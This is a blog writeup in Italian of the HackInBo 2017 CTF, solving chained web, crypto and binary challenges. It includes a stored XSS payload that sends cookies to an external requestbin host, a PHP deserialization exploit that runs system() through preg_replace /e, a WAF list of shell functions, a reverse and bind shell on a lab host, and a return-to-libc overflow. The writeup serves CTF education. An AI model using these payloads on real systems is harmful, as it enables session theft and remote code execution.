---
layout: post
title:  "HackInBoCTF 2017 Spring Edition"
date:   2017-04-03 00:00
categories: CTF
tags: [HiBCTF2017]
categories: [Web,Crypto,Reversing]
author: jbz
---


Abbiamo partecipato al CTF organizzato da HackInBo per la Spring Edition 2017.
Il CTF era disponibile al seguente indirizzo: [http://ctf-hib.thesthack.com/](http://ctf-hib.thesthack.com/)

Il CTF aveva 10 challenge sequenziali, nelle quali ognuna forniva informazioni o privilegi per poter accedere ad una o più challenge successive (oltre a ovviamente la flag). Questo writeup mostra le soluzioni per tutte le challenge.

Un ringraziamento a [HackInBo](https://www.hackinbo.it) ed [HacktiveSecurity](https://www.hacktivesecurity.com) a per aver messo a disposizione a realizzato il CTF.

Ci vediamo a Bologna!

---
## It's Not that hard

Nella [home page](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/index.php) del sito principale c'era un commento nel codice HTML:

`<!-- SXQncyBub3QgdGhhdCBoYXJkIGZsYWc6IDRiMTQwZjdlN2QzYzA0YmI3YjU0ZjY5NmFiNThhNDQx -->`

Tradotto dal base64 restituiva:
`It's not that hard flag: 4b140f7e7d3c04bb7b54f696ab58a441`

---
## Oh, did I get banned?

Il file [403.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/403.php) conteneva un commento con la flag:
`<!--Banned Flag: 8e0759573823193de62f691487b2e42e !-->`

---
## Double Rainbow

Questa flag è stata recuperata dopo aver avuto accesso ad "Admin Session". Leggendo il codice di [settings.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/settings.php). La pagina accettava il parametro `edit` via `GET`, che permetteva di accedere a qualsiasi file sul sistema.

Tramite nikto è stata trovata la pagina [http://ctf-hib.thesthack.com/invoker/JMXInvokerServlet](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/JMXInvokerServlet) che diceva:
`Double Rainbow Flag is sleeping here`

Mandando una richiesta del tipo `settings.php?edit=invoker/JMXInvokerServlet/index.php` è stato possibile accedere al sorgente della pagina, che conteneva la flag:

```html
<?php 
echo ("Double Rainbow Flag is sleeping here"); 
/*Double rainbow flag: *6333d7fdc399af3b94177f037de19c2f**/ 
?>
```


---
## Tgialli User's Session

Dopo aver provato l'impossibile e aver quasi perso le speranze, abbiamo trovato una blind SQL Injection nel cookie `PHPSESSID`. L'unico modo per risolverla era facendo un'exploitation time-based, dato che non era possibile ottenere nessun output.

Siamo riusciti a dumpare la sessione dell'utente `tgialli` che era presente nel database:
`bkmu18q6edsn2h74kge1sp2eu3`

---
## User flag

Una volta settato il cookie `PHPSESSID` con il valore appena ottenuto, siamo riusciti ad accedere alla pagina [user.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/user.php) che conteneva questo commento:

`<!--User Flag: e10602828174be00e0a30aa5bf1d2ac9 !-->`

---
## C Source

Questa flag è stata ottenuta dopo aver ottenuto code execution sul webserver (vedi la sezione dopo `Admin Session`), dato che la flag era in un binario offerto dal server backend (che aveva il compito di gestire i pagamenti).

Durante l'analisi (reversing) del binario **server** oltre a rilevare una vulnerabilità di tipo stack-based overflow abbiamo notato che vi era una costante mai utilizzata all'interno del codice questa riportava il seguente MD5 (flag)

`355c71e5b0f5e70ab77f27d750a2a75a`

---
## Admin Session

La pagina [user.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/user.php) conteneva un form tramite il quale si poteva mandare un messaggio al "team di support" del sito web. Abbiamo capito che era possibile mandare del codice JavaScript che poi veniva eseguito, quindi una store Cross-Site Scripting.

Il payload che ci ha permesso di ottenere la sessione dell'amministratore è il seguente:

```html
<scalertript>document.write("<img src=http://requestb.in/xxxxxxx?"+document.cookie+">")</scalertript>
```

Abbiamo utilizzato `scalertript` come tag perché il server filtrava alcune parole chiave, tra cui `alert`. Annidando la stringa in questo modo abbiamo fatto sì che il tag finale risultasse `<script>`.

Il risultato/flag era: `PHPSESSID=7fa26c8192a47a49b9530be18e1310e5`

---
A questo punto abbiamo capito che dovevamo andare oltre e compromettere il webserver tramite una code execution. Dopo aver ottenuto accesso all'area amministrativa del sito, abbiamo notato che andando alla pagina `settings.php` veniva impostato un cookie `editor` che conteneva il base64 di un oggetto PHP serializzato:

```json
O:11:"StyleEditor":3:{s:8:"filepath";s:15:"./css/asset.css";s:8:"fullpath";s:26:"/var/www/CTF/css/asset.css";s:7:"auditor";O:13:"SecurityCheck":2:{s:7:"attacks";a:2:{i:0;s:9:"([.]+\/)/";i:1;s:8:"(\x00)$/";}s:7:"replace";s:2:"./";}}
```

Cambiando i valori di `fullpath` e/o `filepath` era possibile accedere a qualsiasi file su disco. Abbiamo ottenuto il sorgente di [settings.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/settings.php) che ci ha permesso di recuperare facilmente la flag `Double rainbow`.

Il file `settings.php` includeva [editor.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/editor.php) che conteneva i dettagli di come veniva utilizzato l'oggetto `StyleEditor`:

```php
<?php
Class StyleEditor{
    public $filepath;
    public $fullpath;
    public $auditor;
    
    function __construct($fp){
        $this->auditor  = new SecurityCheck;
        $this->filepath = $fp;
        $this->fullpath = $this->get_path();
    }

    [...]    
    
    function __wakeup(){
      $badwords = array(
                     "eval",
                     "passthru",
                     "system","
                     shell_exec",
                     "popen",
                     "preg_match",
                     "preg_replace",
                     "dl",
                     "fwrite",
                     "file_put_contents",
                     "exec",
                     "fputs",
                     "`",
                     "require",
                     "include",
                     "include_once",
                     "require_once"
               );
        foreach ($this->auditor->attacks as $attack) {
         foreach ($badwords as $hackattempt){
            if(in($this->auditor->replace, $hackattempt)){
               die("WAF");
            }
         }
         $this->fullpath = @preg_replace("/". $attack , $this->auditor->replace , $this->fullpath);
        }
    }
}

Class SecurityCheck {
    public $attacks = array("([.]+\/)/", "(\\x00)$/");    
    public $replace = './';    
    public function get_attacks()
    {
        return $this->attacks;
    }    
}
?>
```

La classe definisce il metodo `__wakeup`, che viene chiamata quando un oggetto viene deserializzato. Notiamo che il metodo esegue `preg_replace` su alcuni parametri che vengono definiti dall'oggetto (e che controlliamo), dopo aver verificato che i parametri non contengono "badwords" - che permetterebbero l'esecuzione di codice via il flag `/e` di `preg_replace`.

Abbiamo bypassato questo check riutilizzando l'array `badwords` per richiamare una delle funzioni che viene controllata. Abbiamo preparato uno script php che genera l'oggetto con i parametri che vogliamo e lo converte automaticamente nel formato utilizzabile dal cookie `editor`:

```php
<?php
class StyleEditor {
    public $fullpath;
    public $filepath;
    public $auditor; 

    public function __construct() {
        $this->fullpath = "/var/www/CTF/settings.php"; 
        $this->filepath = "./settings.php"; 
        $this->auditor = new SecurityCheck; 
    }
}
class SecurityCheck{
    public $attacks = array("settings/e");
    public $replace = '\$badwords[2](\$_POST["x"]);';
}
print serialize(new StyleEditor);
print "\n";
print base64_encode(serialize(new StyleEditor));
echo "\n";
```

I parametri che vengono utilizzati per effettuare command execution sono due:
- `attacks` viene utilizzato come primo parametro della `preg_replace`. Come vedete c'è il flag `/e` alla fine che permette l'esecuzione del codice quando la regex è valida.
- `replace` che contiene il codice da eseguire. `$badwords[2]` corrisponde a `system`, e possiamo eseguire qualsiasi comando passato alla variabile `x` tramite `POST`.

Una volta impostato il cookie, possiamo eseguire qualsiasi comando sul server tramite richieste `POST`. Abbiamo eseguito una semplice shell reverse in Python e siamo riusciti ad ottenere accesso interattivo al webserver.

---
## PCI Zone

Nel pannello amministrativo del webserver abbiamo notato un indirizzo IP interno `10.0.0.165` che veniva utilizzato dalla piattaforma come gateway di pagamento. Una volta ottenuto accesso al webserver, abbiamo fatto un portscan di quella macchina tramite netcat:

```bash
nc -v -z 10.0.0.165 1-65535
```
Abbiamo trovato due porte aperte: la `22`,  `80` e la `65099`.

Alla porta `65099` rispondeva un servizio custom che dopo aver passato una stringa qualsiasi restituiva `[OK] CC RECEIVED`. Alla porta `80` rispondeva un webserver.

Per quanto concerne la porta `80`, questa riportava una pagina web con l'applicativo `PCI Token Generator 0.0.2` il quale restituiva un commento: `<!-- it's kinda bugged, read the changelog-->`.

Abbiamo fatto una richiesta a `/changelog.txt` e abbiamo ottenuto:
```
PCI Token Generator
>        v.0.0.3
        TODO: we should definitely fix this code afin the next release
        OS: Linux debian 3.16.0-4-686-pae #1 SMP Debian 3.16.39-1+deb8u1
        */+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        $settings = array(
           'cc' => $_POST['cc'],
           'value' => ('echo ' . escapeshellarg("{$_POST['cc']}")),
        );

        if (@$settings['value']) {
                passthru($settings['value']);
        */+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

>        v.0.0.2
        + added serialize etc
 
>        v.0.0.1
        + added the crypto functionality
        + CC Receiver: /server
```
La prima cosa che abbiamo notato è stata la presenza di un `server` per ricevere le informazioni riguardanti le carte di credito e la funzione `passthru()` di PHP protetta da `escapeshellarg()`.

Come primo tentivo abbiamo deciso di procedere per reversing e quindi analizzare il binario server recuperato all'indirizzo `http://10.0.0.165/server`.

Analizzando le stringhe del binario abbiamo notato la stringa `[OK] CC RECEIVED` la quale ci ha confermato che quel binario è in esecuzione ed in ascolto sulla porta `65099`.

Abbiamo quindi reversato il binario e abbiamo trovato alcune funzioni: `viewer`, `processcc` e ovviamente `main`. Abbiamo disassemblato le varie funzioni e abbiamo notato che la funzione viewer contiene un buffer overflow:

```asm
 0804892d <viewer>:
 804892d:        55                           push   %ebp
 804892e:        89 e5                        mov    %esp,%ebp
 8048930:        81 ec 08 04 00 00            sub    $0x408,%esp
 8048936:        83 ec 08                     sub    $0x8,%esp
 8048939:        ff 75 08                     pushl  0x8(%ebp)
 804893c:        8d 85 f8 fb ff ff            lea    -0x408(%ebp),%eax
 8048942:        50                           push   %eax
 8048943:        e8 08 fc ff ff               call   8048550 <strcpy@plt>
 8048948:        83 c4 10                     add    $0x10,%esp
 804894b:        83 ec 08                     sub    $0x8,%esp
 804894e:        8d 85 f8 fb ff ff            lea    -0x408(%ebp),%eax
 8048954:        50                           push   %eax
 8048955:        68 d9 8a 04 08               push   $0x8048ad9
 804895a:        e8 91 fb ff ff               call   80484f0 <printf@plt>
 804895f:        83 c4 10                     add    $0x10,%esp
 8048962:        c9                           leave
 8048963:        c3                           ret
```

Ciò che salta subito all'occhio è l'utilizzo della funzione `strcpy`, notoriamente vulnerabile in quanto non effettua nessun controllo di lunghezza quando copia un buffer sorgente in uno di destinazione. Questa `strcpy` copia in un buffer grande 1032 bytes (0x408 - indirizzo 8048930) la stringa che passiamo al demone.

Analizzando il binario abbiamo notato che l'unica mitigation presente era `NX` quindi non potevamo eseguire nessuno shellcode custom passato direttamente come input. Rimaneva però possibile effettuare una `return2libc` per eseguire comandi arbitrari.

Per effettuare questo tipo di attacco, abbiamo bisogno dell'indirizzo di una funzione che vogliamo riutilizzare per eseguire comandi. Il terzo hint del CTF ci ha fornito l'indirizzo di `system`, e tramite questo indirizzo più le informazioni svelate nel changelog abbiamo recuperato anche l'indirizzo di `exit`.

Purtroppo rimane un altro problema il binario non ha controllo sui file descriptor usati dal nuovo processo che andremo a lanciare, e di conseguenza l'esecuzione di comandi sarà blind e non sarà possibile utilizzare interattivamente la shell.
l'ultima parte del payload chiamata per semplicità "comando" dovrà contenere il comando da far eseguire ad system e sarà un puntato ad una stringa contenuta nel binario. 
Abbiamo quindi due possibilità o andare a cercare in memoria gli indirizzi di ogni singola lettera componendo cosi il nostro comando o più semplicemente bruteforzare il puntatore al buffer che inviamo tramite socket, abbiamo optato per la seconda.
tramite analisi dimanica su una macchina debian simile al target abbiamo notato che l'assenza di ASLR faceva si che il nostro buffer fosse presente nel range 0xbfffe000 - 0xbfffffff lasciando così 8191 possibili indirizzi da bruteforzare.
Abbiamo quindi realizzato uno script python per eseguire un comando arbitrario una volta indovinato l'indirizzo corretto [bruteforcer.py](https://raw.githubusercontent.com/jbzteam/CTF/master/HiB17_SpringEdition/bruteforce.py)
una volta terminato il bruteforce abbiamo notato che il nostro comando era stato eseguito consentendoci l'accesso alla macchiana mediante la porta 31337
```
www-data@www:/var/www/CTF/support$ nc 10.0.0.165 31337
nc 10.0.0.165 31337
Insert password for JBZ TEAM: ***********
python -c "import pty;pty.spawn('/bin/bash')"
sysop@debian:/tmp/...$ id
uid=1000(sysop) gid=1000(sysop) groups=1000(sysop),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```
Abbiamo così ottenuto la flag nascosta sul server
```
pci zone flag: 95429c6709bb99d1ed06d2a99bc6ffbc
```

---
## ECB Padding

Un commento nella pagina index.php diceva: `<!-- it's kinda bugged, read the changelog-->`
Abbiamo visitato quindi il file changelog.txt (indicato sopra) capendo cosi' parte del funzionamento del file index.php.

Facendo una richiesta tramite il form nella pagina [index.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/index.php_crypto) e ricaricando la stessa abbiamo notato che il server oltre a printare il valore di `CC` printava l'oggetto `$settings`. Abbiamo quindi notato un cookie chiamato "pci_crypt".

Decodando il cookie "pci_crypt" (urldecode -> base64decode -> hex) abbiamo ottenuto una stringa esadecimale cifrata.
Probabilmente l'oggetto `$settings` serializzato e cifrato in ECB.

Per facilitare l'invio delle richieste e leggere i cookie abbiamo scritto [questo script Python](https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/hib17_crypto.py).

Abbiamo notato che inviando varie richieste, nei ciphertext i primi 128 bit (il primo blocco) era costante.
Un comportamento condiviso sia da ECB che da CBC con IV costante.

Inizialmente pensavamo ad un algoritmo 128bit in ECB (come suggeriva il testo della flag, nds), sfortunatamente dopo le due prove sottostanti abbiamo capito che ogni blocco aveva un legame con il precedente. Si trattava di CBC. 
Inoltre il numero di blocchi di plaintext differiva da quello dei blocchi di ciphertext, qualcosa veniva appeso al ciphertext diversamente al funzionamento di un normale padding.

In questa immagine possiamo vedere come i blocchi 1 e 2 dei plaintext destra e sinistra combaciano e quindi i relativi blocchi 1 e 2 del ciphertext sono identici
![Crypto1](https://raw.githubusercontent.com/PequalsNP-team/pequalsnp-team.github.io/master/assets/hib17_crypto1.png)

In questa immagine invece il blocco 1 e 3 del plaintext a sinistra e il blocco 1 e 4 di quello di destra combaciano, ma solo il blocco 1 del ciphertext e' identico
![Crypto2](https://raw.githubusercontent.com/PequalsNP-team/pequalsnp-team.github.io/master/assets/hib17_crypto2.png)

Per questo motivo abbiamo sospeso questa challenge aspettando di risolvere "PCI Zone Flag" che ci avrebbe dato RCE sulla stessa macchina cosi da poter osservare i sorgenti.
Nei sorgenti era presente la flag

`856bc9fc0d0b3c23d1a58c8e93a433e4`
 

---
## Credit Card n.6666

Dal database abbiamo estratto il `PCI_token` della carta di credito con `id` *6666*:
`7cLGMYqWY2bGgYPIDlE+CODHAwwLJiAMIUSghfke+QgCMNrEQyj7TlnqU4nNuZFTLsVvVWQ15jH3JYsgvwq6/CcaQczRD/0csxB7rqiR3DQ=`

Decodificandolo dalla base64 risultava una stringa apparentemente cifrata.
Abbiamo pensato di decifrarla grazie al *PCI Token Generator* della challenge "ECB Padding".

Utilizzando le funzioni dello script per la suddetta challenge:
```python
ciphertext = parse.quote("7cLGMYqWY2bGgYPIDlE+CODHAwwLJiAMIUSghfke+QgCMNrEQyj7TlnqU4nNuZFTLsVvVWQ15jH3JYsgvwq6/CcaQczRD/0csxB7rqiR3DQ=")
resp = requests.get('http://url:9090/index.php', cookies={'pci_crypt': ciphertext})
print(resp.text)
```

Il risultato restituito dal server era `5512782764526946|170|10/08/2020`. 
Hashato in md5 abbiamo ottenuto la flag:

`bc13ff4c1b4a7ada0c6dcf2dec4e4404`
![flags](https://raw.githubusercontent.com/jbzteam/CTF/master/HiB17_SpringEdition/complete.jpg)

## Bonus - Aranzulla's pass

la flag è w1k1p3d14

-------------------------------------------------------------------------
## The End                                 

